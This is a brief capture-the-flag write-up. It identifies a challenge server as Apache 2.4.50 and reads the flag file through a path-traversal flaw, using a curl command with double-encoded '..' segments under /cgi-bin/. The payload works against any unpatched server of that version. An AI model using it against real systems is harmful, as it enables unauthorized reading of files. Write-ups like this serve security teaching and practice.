Going into the link we get a website with the text "It works!", and no more. 

We can send a GET-request to the webpage to see the server version.

Using httpie:
```
http GET http://io.ept.gg:30071/ 
```
Shows us 
> Server: Apache/2.4.50 (Unix)

A little research shows us that this server is vulnerable to a path-traversal attack (https://www.exploit-db.com/exploits/50406)
The webpage also gives us the method to perform this attack.

```
curl http://io.ept.gg:30071//cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/opt/flag
```
